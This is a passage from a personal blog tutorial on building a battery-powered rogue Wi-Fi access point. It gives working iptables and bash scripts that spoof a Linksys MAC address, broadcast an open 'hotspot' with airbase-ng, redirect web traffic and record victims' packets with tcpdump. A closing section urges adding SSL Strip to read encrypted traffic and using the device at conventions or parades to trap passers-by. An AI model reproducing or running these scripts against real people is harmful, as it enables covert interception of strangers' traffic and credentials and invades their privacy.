    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/sh</span>
<span class="nv">PATH</span><span class="o">=</span>/usr/sbin:/sbin:/bin:/usr/bin
<span class="c">#</span>
<span class="c"># delete all existing rules.</span>
<span class="c">#</span>
iptables <span class="nt">-F</span>
iptables <span class="nt">-t</span> nat <span class="nt">-F</span>
iptables <span class="nt">-t</span> mangle <span class="nt">-F</span>
iptables <span class="nt">-X</span>
<span class="c"># Always accept loopback traffic</span>
iptables <span class="nt">-A</span> INPUT <span class="nt">-i</span> lo <span class="nt">-j</span> ACCEPT
<span class="c"># Allow established connections, and those not coming from the outside</span>
iptables <span class="nt">-A</span> INPUT <span class="nt">-m</span> state <span class="nt">--state</span> ESTABLISHED,RELATED <span class="nt">-j</span> ACCEPT
iptables <span class="nt">-A</span> INPUT <span class="nt">-m</span> state <span class="nt">--state</span> NEW <span class="nt">-j</span> ACCEPT
iptables <span class="nt">-A</span> FORWARD <span class="nt">-i</span> wlan1 <span class="nt">-o</span> at0 <span class="nt">-m</span> state <span class="nt">--state</span> ESTABLISHED,RELATED <span class="nt">-j</span> ACCEPT
<span class="c"># Allow outgoing connections from the LAN side.</span>
iptables <span class="nt">-A</span> FORWARD <span class="nt">-i</span> at0 <span class="nt">-o</span> wlan1 <span class="nt">-j</span> ACCEPT
iptables <span class="nt">-t</span> nat <span class="nt">-A</span> PREROUTING <span class="nt">-p</span> tcp <span class="nt">-i</span> at0 <span class="nt">--destination-port</span> 80 <span class="nt">-j</span> REDIRECT <span class="nt">--to-port</span> 8080
<span class="c"># Masquerade.</span>
iptables <span class="nt">-t</span> nat <span class="nt">-A</span> POSTROUTING <span class="nt">-o</span> wlan1 <span class="nt">-j</span> MASQUERADE
<span class="c"># Don't forward from the outside to the inside.</span>
iptables <span class="nt">-A</span> FORWARD <span class="nt">-i</span> wlan1 <span class="nt">-o</span> wlan1 <span class="nt">-j</span> REJECT
<span class="c"># Enable routing.</span>
<span class="nb">echo </span>1 <span class="o">&gt;</span> /proc/sys/net/ipv4/ip_forward
</code></pre></div>    </div>
  </li>
  <li>If that is all working for you create a bash script with the following (with values that will work for your network)
    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#! /bin/bash</span>
<span class="c"># bring up the rogue and start sniffing</span>
<span class="nb">cd</span> /
<span class="c"># change the mac to a Linksys AP</span>
/usr/bin/macchanger <span class="nt">--mac</span><span class="o">=</span>00:06:25:3E:BD:93 wlan0
/usr/bin/macchanger <span class="nt">-r</span> wlan1
<span class="nb">echo</span> <span class="s2">"connecting to phone"</span>
/sbin/wpa_supplicant <span class="nt">-i</span> wlan1 <span class="nt">-B</span> <span class="nt">-c</span> /root/iphone.conf
<span class="nb">sleep </span>45
<span class="nb">echo</span> <span class="s2">"getting ip address"</span>
/sbin/dhclient wlan1
/usr/local/sbin/airbase-ng <span class="nt">--essid</span> hotspot <span class="nt">-c</span> 11 wlan0 &amp;
<span class="nb">sleep </span>15
/sbin/ifconfig at0 10.1.1.2 netmask 255.255.255.0
/sbin/route add <span class="nt">-net</span> 10.1.1.0 netmask 255.255.255.0 gw 10.1.1.2
/sbin/ifconfig at0 up
<span class="nb">sleep </span>5
/usr/sbin/dhcpd <span class="nt">-cf</span> /etc/dhcp/dhcpd.conf
./root/Rogue-Sniff/iptables.sh
tcpdump <span class="nt">-i</span> wlan1 <span class="nt">-s</span> 0 <span class="nt">-e</span> <span class="nt">-vv</span> <span class="nt">-XX</span> <span class="nb">link</span><span class="o">[</span>25] <span class="o">!=</span> 0x80 <span class="nt">-w</span> /root/Rogue-Sniff/capture
</code></pre></div>    </div>
  </li>
  <li>Add a line to execute this script at startup with rc.local</li>
  <li>Now that your CF card is at a point where you want it pull it off the Alix board and DD it to another Linux box so that you will never have to go through all this again.</li>
  <li>Connect your portable power source and out the door you go!  I used two 9V batteries that do power the setup, but I highly doubt that it would last long.</li>
</ol>

<h2 id="going-further">Going Further</h2>

<ol>
  <li>When acting as an AP for people the main point here is to sniff traffic and record it.  What point would it be to record encrypted traffic?  Go a little further with this and throw SSL Strip into the mix!</li>
  <li>Very Useful Applications (if you have room on the CF)
    <ul>
      <li>python</li>
      <li>python-twisted-web</li>
      <li>kismet</li>
      <li>nmap</li>
      <li>telnet</li>
      <li>fping</li>
      <li>smbclient</li>
      <li>curl</li>
      <li>links</li>
      <li>dnsutils</li>
      <li>Tenable Nessus</li>
      <li>Metasploit Framework</li>
    </ul>
  </li>
  <li>The best places to take advantage of wireless networks is in highly populated areas that do not have hotspots.  Think of a convention or parade.  Some people really what to get on the net, and you could even highjack their broadcasts … say they are probing for “linksys” why not rename your SSID?</li>
</ol>

<h2 id="images-of-my-project">Images of My Project</h2>
<p><img src="/assets/images/mobile/1.png" alt="alt text" title="1" /></p>

<p><img src="/assets/images/mobile/2.png" alt="alt text" title="2" /></p>

<p><img src="/assets/images/mobile/3.png" alt="alt text" title="3" /></p>

<p><img src="/assets/images/mobile/4.png" alt="alt text" title="4" /></p>

    </section>
  </article>
</div>

    </div>

    

    <div class="page__footer">
      <footer>
        <!-- start custom footer snippets -->

<!-- end custom footer snippets -->
        <div class="page__footer-follow">
  <ul class="social-icons">
    
      <li><strong>Follow:</strong></li>
    

    
      
        
      
        
      
        
      
        
      
        
      
        
      
    

    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
  </ul>
</div>

<div class="page__footer-copyright">&copy; 2019 RabbidByte. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/minimal-mistakes-jekyll-theme/" rel="nofollow">Minimal Mistakes</a>.</div>

      </footer>
    </div>

    
  <script src="/assets/js/main.min.js"></script>
  <script defer src="https://use.fontawesome.com/releases/v5.7.1/js/all.js" integrity="sha384-eVEQC9zshBn0rFj4+TU78eNA19HMNigMviK/PU/FFjLXqa/GKPgX58rvt5Z8PLs7" crossorigin="anonymous"></script>








  </body>
</html>
